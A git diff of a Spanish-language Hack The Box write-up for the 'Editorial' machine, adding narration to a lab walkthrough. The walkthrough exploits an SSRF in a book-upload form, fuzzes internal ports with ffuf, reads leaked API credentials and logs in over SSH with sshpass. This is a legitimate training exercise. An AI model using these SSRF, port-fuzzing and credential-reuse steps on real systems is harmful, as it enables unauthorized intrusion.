@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Editorial`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.20 -oG allPorts
@@ -47,9 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 33.63 seconds
            Raw packets sent: 76684 (3.374MB) | Rcvd: 76462 (3.059MB)
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -62,9 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 33.63 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.20 -A -oN targeted -oX targetedXML
@@ -97,7 +93,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -106,11 +102,11 @@ Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5197_vmware_bQsMH8iKh1.png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos en nuestro archivo `/etc/hosts`la siguiente entrada correspondiente.
 
 ```bash
 ❯ cat /etc/hosts | grep editorial
@@ -119,20 +115,18 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ## Web Enumeration
 
-
+Realizaremos una comprobación de las tecnologías que son utilizadas en el sitio web.
 
 ```bash
 ❯ whatweb http://editorial.htb
 http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]
 ```
 
-
-
-
+Accederemos a [http://editorial.htb](http://editorial.htb) y nos encontramos con la siguiente página web. Al parecer, se trata de una página de libros.
 
 <figure><img src="../../.gitbook/assets/imagen (436).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de páginas y directorios de la aplicación web, en el cual se nos muestra el siguiente resultado obtenido.
 
 ```bash
 ❯ feroxbuster -u http://editorial.htb/ -t 200 -C 500,502,404
@@ -174,28 +168,28 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 ### Server Side Request Forgery (SSRF) Exploitation + Internal Port Discovery
 
+Al acceder a [http://editorial.htb/upload](http://editorial.htb/upload) nos encontramos con la siguiente página web en la cual al parecer nos permite subir nuestro propio libro para que la editorial nos lo revise.
 
+Entre los campos que nos permite añadir o modificar, se nos indica que podemos añadir una URL de nuestra cover de nuestro libro, subir el libro y añadir la descripción correspondiente.
 
 <figure><img src="../../.gitbook/assets/imagen (437).png" alt=""><figcaption></figcaption></figure>
 
-
+Lo primero se nos ocurre es en probar si la URL que podemos indicar, puede ser la de nuestro servidor web que nos montaremos a continuación. Por ello, nos levantamos a través de python un servidor web.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-send book nada
+Ingresamos nuestra URL de nuestro servidor web que apunte a un recurso (inexistente) y al darle a la opción de `Send book info` no obtenemos resultado ninguno en nuestro servidor web.
 
 <figure><img src="../../.gitbook/assets/imagen (438).png" alt=""><figcaption></figcaption></figure>
 
-preview![](<../../.gitbook/assets/imagen (440).png>)
+Probamos de darle a la opción de `Preview` para verificar si a través de esta opción recibíamos algún tipo de solicitud en nuestro servidor web.
 
 <figure><img src="../../.gitbook/assets/imagen (439).png" alt=""><figcaption></figcaption></figure>
 
-
+Comprobamos en nuestro servidor web que se ha recibido correctamente la solicitud por el método `GET` a nuestro servidor web a través de la dirección IP del servidor víctima.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -204,13 +198,25 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.20 - - [21/Feb/2025 16:27:21] "GET /gzzcoo HTTP/1.1" 404 -
 ```
 
+Teniendo esto en cuenta, se nos pueden ocurrir probar diferentes tipos de ataque, como por ejemplo, un `Server-Side Request Forgery (SSRF)`.
 
+Para ello, primero interceptaremos la solicitud a través de `BurpSuite` al darle a la opcioón de `Preview` y modificaremos la URL para que apunte a un servidor web interno por el puerto 80. En la respuesta por parte del servidor, se nos proporciona un resultado, pudiendo confirmar la existencia de un posible `SSRF`.
 
+{% hint style="info" %}
+El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.
 
+En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.
+
+El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.
+
+Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/5203_vmware_pxJkwKBpks.png" alt=""><figcaption></figcaption></figure>
 
+Para realizar un escaneo de posibles puertos internos abiertos que pudieran haber en la máquina víctima, haremos uso de la herramienta de `ffuf`para realizar `fuzzing`.
 
+Para ello, nos guardaremos el contenido de la petición que se tramita por `POST` en `BurpSuite` e indicaremos donde queremos que se aplique el `fuzzing`, en este caso, en donde hemos indicado la palabra `FUZZ`.
 
 {% code title="request" %}
 ```bash
@@ -240,7 +246,9 @@ Content-Type: application/octet-stream
 ```
 {% endcode %}
 
+Realizaremos el `fuzzing` a través de `ffuf` sobre la URL indicada pasándole nuestro archivo de la petición que disponemos para que realice el `fuzzing` e indicaremos también que realice una secuencia entre el 0 y 65365 que son el nº de puertos existentes.
 
+En el resultado obtenido, comprobamos que nos aparece que ha encontrado el puerto `5000`.
 
 ```bash
 ❯ ffuf -u http://editorial.htb/upload-cover -request request -w <( seq 0 65535) -ac
@@ -288,13 +296,13 @@ ________________________________________________
 5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 87ms]
 ```
 
-
+Al revisar manualmente con `BurpSuite` sobre el `SSRF` sobre la dirección [http://127.0.0.1:5000](http://127.0.0.1:5000), también nos devuelve una información.
 
 <figure><img src="../../.gitbook/assets/5204_vmware_flfFh5T85E.png" alt=""><figcaption></figcaption></figure>
 
 ### API Enumeration trough SSRF
 
-
+Realizaremos un `cURL` sobre el resultado anteriormente obtenido. En el resultado que se nos muestra, nos aparece la existencia de una `API` con diferentes `endpoints`.
 
 ```bash
 ❯ curl -s 'http://editorial.htb/static/uploads/45dcd0c6-2ec4-4305-a9d8-d507844a6ed2' | jq .
@@ -348,11 +356,13 @@ ________________________________________________
 }
 ```
 
+Realizaremos una enumeración a través del `SSRF` en combinación con la `API` para comprobar los diferentes endpoints.
 
+En este caso, el endpoint que probamos es `/api/latest/metadata/messages/authors` que según comprobamos anteriormente, se almacenan los mensajes enviados a los nuevos autores. En el resultado obtenido en la respuesta del servidor, obtenemos el siguiente resultado.
 
 <figure><img src="../../.gitbook/assets/5205_vmware_2EVkH16e1R.png" alt=""><figcaption></figcaption></figure>
 
-
+Realizamos un `cURL` sobre el resultado obtenido en la respuesta por parte del servidor y comprobamos el siguiente contenido. En el resultado obtenido se comprueba que se nos proporcionan credenciales de acceso al sistema.
 
 ```bash
 ❯ curl -s 'http://editorial.htb/static/uploads/5e9d4edf-c293-476e-a7cf-35f544a4f82b' | jq .
@@ -361,42 +371,15 @@ ________________________________________________
 }
 ```
 
-
+Probamos de autenticarnos con estas credenciales obtenidas al equipo a través de `SSH`y logramos obtener acceso. Por otro lado, tambiémn conseguimos obtener la flag de **user.txt**.
 
 ```bash
 ❯ sshpass -p 'dev080217_devAPI!@' ssh dev@10.10.11.20
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Fri Feb 21 03:51:16 PM UTC 2025
-
-  System load:           0.08
-  Usage of /:            60.7% of 6.35GB
-  Memory usage:          12%
-  Swap usage:            0%
-  Processes:             224
-  Users logged in:       0
-  IPv4 address for eth0: 10.10.11.20
-  IPv6 address for eth0: dead:beef::250:56ff:fe94:291a
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
 Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
 dev@editorial:~$ cat user.txt 
-ca92cd5eefce4a1cb2f4a3e9bb900aea
+ca92c***************************
 ```
 
 ## Pivoting to user prod
